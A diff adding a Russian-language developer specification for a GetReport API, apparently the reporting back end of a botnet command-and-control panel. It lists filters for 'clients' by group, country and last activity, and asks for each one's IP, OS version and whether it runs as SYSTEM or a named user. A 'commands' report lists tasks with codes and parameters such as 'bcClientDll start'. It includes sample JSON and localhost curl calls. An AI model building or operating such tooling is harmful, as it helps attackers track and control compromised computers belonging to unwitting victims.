@@ -1,0 +1,74 @@
+
+Group
+ClientID
+CreatedAt From and To
+Last Activity (10 mins, 30 minutes, 3 hours, 1 day)
+Country(одна или несколько, или не одной)
+
+
+на выходе мы получаем:
+
+
+CreatedAt
+Client ID - последние цифры что после точки.
+Group
+Last Activity
+Importance
+System
+IP
+Country
+Version
+Поле Info, это внутри Client id. Нужно видеть только по commands - 42, 43, 62, 63. Нужно видеть именно Info оттуда. Отчеты за последние сутки.
+права SYSTEM or USER. Для этого смотрим по дате последний key - user. Там написанно либо SYSTEM, либо что-то другое. Это тоже в выдаче рисуем. user - SYSTEM, или к примеру user - vasya.
+
+----------------------------
+
+Доступ к отчетам осуществляется через GetReport метод API.
+
+Обязательные параметры:
+  * report - имя отчета.
+  * query -- json-объект для запроса
+
+Отчеты:
+
+  ## client_info
+
+  Получить клиентов согласно фильтра (json-объекта).
+  Поля (опционально):
+
+    * group -- группа. Строка или список строк.
+    * client_id -- id-клиентов. Строки или список строк.
+    * created_at : { from: ..., to: ... } -- дата создания клиента. from, to -- время в SQL-формате.
+    * last_activity - время с момента последней активности, секунды (число).
+    * country -- страна. Строка или список строк.
+
+  Ответ: JSON-список клиентов с их информацией.
+  [{"client_id":"AABBCCDDAABBCCDDAABBCCDDAABBCCDD","client_ver":1,"country":"US","created_at":"2017-05-08T08:30:46.782539Z","devhash":"ABEiM0RVZneImaq7zN3u/wARIjNEVWZ3iJmqu8zd7v8=","group":"group1","importance":0,"ip":"8.8.8.8","is_manual_importance":false,"last_activity":"2017-05-08T08:30:46.782539Z","logged_at":"2017-05-08T08:30:46.782539Z","name":"asdgahjsdgajsdgjh","sys_ver":"Win16","userdefined":0},{"client_id":"AABBCCDDAABBCCDDAABBCCDDAABB7755","client_ver":1098,"country":"","created_at":"2017-05-10T13:52:37.016375Z","devhash":"3s4RIjNEVWZ3iJkAzLuq/97OESIzRFVmd4iZAMy7qv8=","group":"group1","importance":0,"ip":"44fdefgfdtyhfdertg","is_manual_importance":false,"last_activity":"2017-05-10T13:52:37.016375Z","logged_at":"2017-05-10T13:52:37.016375Z","name":"asdgahjsdgajsdgjh","sys_ver":"win_7_32","userdefined":0},{"client_id":"0AABBCCDDEEF11223344556677889900","client_ver":1098,"country":"JP","created_at":"2017-05-10T13:57:16.788378Z","devhash":"3s4RIjNEVWZ3iJkAzLuq/97OESIzRFVmd4iZAMy7qv8=","group":"group1","importance":0,"ip":"1.5.7.9","is_manual_importance":false,"last_activity":"2017-05-10T13:57:16.788378Z","logged_at":"2017-05-10T13:57:16.788378Z","name":"asdgahjsdgajsdgjh_W617600","sys_ver":"win_7_32","userdefined":0}]
+  поле devhash закодировано в base64.
+
+  Пример вызова:
+  curl -v -X POST -H "x-forwarded-for: 1.1.1.1" "http://localhost:8090/1/1/GetReport?report=client_info&query=%7B%22group%22%3A%22group1%22%2C%22last_activity%22%3A1000000000%7D"
+
+  ## commands
+
+  Получить сведения о командах согласно фильтра (json-объекта)
+
+  Поля (опционально):
+
+    * Фильтрация по клиентам:
+    ** group -- группа. Строка или список строк.
+    ** client_id -- id-клиентов. Строки или список строк.
+    ** created_at : { from: ..., to: ... } -- дата создания клиента. from, to -- время в SQL-формате.
+    ** last_activity - время с момента последней активности, секунды (число).
+    ** country -- страна. Строка или список строк.
+
+    * Фильтрация по команде:
+    ** incode -- список типов сообщени. Например: ['61', '62', '63'] или '61'
+
+    Ответ: JSON-список команд с их информацией.
+    [{"cid":"8641225","client_id":"AABBCCDDEEFF11223344556677889900","command_id":"195845","incode":"62","params":"bcClientDll start","result_code":null,"resulted_at":null}]
+
+    Пример вызова:
+    curl -v -X POST -H "x-forwarded-for: 1.1.1.1" "http://localhost:8090/1/1/GetReport?report=commands&query=%7B%22group%22%3A%22group1%22%2C%22last_activity%22%3A1000000000%7D"
+
+
